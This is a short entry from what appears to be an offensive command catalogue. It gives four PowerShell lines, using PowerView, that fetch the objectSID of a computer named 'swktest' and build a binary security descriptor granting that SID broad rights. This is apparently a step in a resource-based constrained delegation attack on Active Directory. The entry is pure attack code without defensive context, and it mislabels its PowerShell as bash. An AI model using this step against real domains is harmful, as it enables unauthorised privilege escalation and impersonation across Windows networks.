---
id: 962bfa88-7413-4412-83c7-6330b3e2e193
name: Create new security descriptor using the objectSID of the swktest computer
type: command
executor: bash
data: '$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand
  objectsid

  $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

  $SDBytes = New-Object byte[] ($SD.BinaryLength)

  $SD.GetBinaryForm($SDBytes, 0)'
output: null
created_at: '2023-04-06T03:56:07.771178+00:00'
updated_at: '2023-04-06T03:56:07.807482+00:00'
---

# Create new security descriptor using the objectSID of the swktest computer

```bash
$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```


